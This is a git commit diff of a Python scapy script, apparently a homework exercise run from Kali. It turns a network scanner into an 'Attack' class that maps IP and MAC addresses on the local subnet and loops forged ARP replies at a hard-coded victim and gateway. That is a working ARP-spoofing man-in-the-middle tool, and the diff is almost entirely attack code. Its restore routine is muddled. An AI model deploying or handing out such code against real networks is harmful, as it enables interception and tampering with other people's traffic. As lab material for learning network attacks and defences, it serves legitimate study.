e1e64cfed3b7c873d361b2e271cfc04617d501cc
zeze <zeze@kali>
2020-04-24 20:21:16 +0800

    zeze.py

--- hw2/zeze.py
+++ hw2/zeze.py
@@ -2,44 +2,50 @@
 import netifaces as ni
 import os
 import scapy.all as scapy
+import time
 
-def get_ip(interfaces):
-    ip = []
-    for i in interfaces:
-        print(i)
-        ip.append(ni.ifaddresses(i)[2][0]['addr'])
-    return ip
+class Attack():
+    def __init__(self):
+        self.ip_list = []
+        self.network = []
+        self.ip_mac = {}
+        self.interfaces = ni.interfaces()
+        self.attacker, self.victim, self.ap = '10.0.2.4', '10.0.2.5', '10.0.2.1'
 
-def get_mac(target_ip):
-    # IP Address for the destination
-    # create ARP packet
-    arp = ARP(pdst=target_ip)
-    # create the Ether broadcast packet
-    # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    # stack them
-    packet = ether/arp
+    def get_ip(self):
+        for i in self.interfaces:
+            self.ip_list.append(ni.ifaddresses(i)[2][0]['addr'])
+        self.network = ['.'.join(i.split('.')[:-1]) + '.0/24' for i in self.ip_list]
 
-    result = srp(packet, timeout=3, verbose=0)[0]
+    def get_mac(self, network):
+        arp_request = scapy.ARP(pdst = network)
+        broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
+        arp_request_broadcast = broadcast / arp_request
+        result = scapy.srp(arp_request_broadcast, timeout = 3, verbose = False)[0]
+        for sent, received in result:
+            self.ip_mac[received.psrc] = received.hwsrc
 
-    # a list of clients, we will fill this in the upcoming loop
-    clients = []
+    def spoof(self, target_ip, spoof_ip): 
+        target_mac = self.ip_mac[target_ip]
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        scapy.send(packet)
 
-    for sent, received in result:
-        # for each response, append ip and mac address to `clients` list
-        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
+    def arp_spoofing(self):
+        while 1:
+            attack.spoof(self.victim, self.ap)
+            attack.spoof(self.ap, self.victim)
+            time.sleep(1)
 
-    # print clients
-    print("Available devices in the network:")
-    print("IP" + " "*18+"MAC")
-    mac_list = {}
-    for client in clients:
-        print("{:16}    {}".format(client['ip'], client['mac']))
-        mac_list[client['ip']] = client['mac']
-    return mac_list
+    def ret_arp_spoofing(self):
+        while 1:
+            attack.spoof(attack.victim, self.victim)
+            attack.spoof(attack.ap, attack.ap)
+            time.sleep(1)
 
-ip_list = get_ip(ni.interfaces())
-network = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:-1]) + '.0/24'
-print(network)
-mac_list = get_mac(network)
+attack = Attack()
+attack.get_ip()
+attack.get_mac(attack.network[1])
+print(attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
+attack.ret_arp_spoofing()
+
 
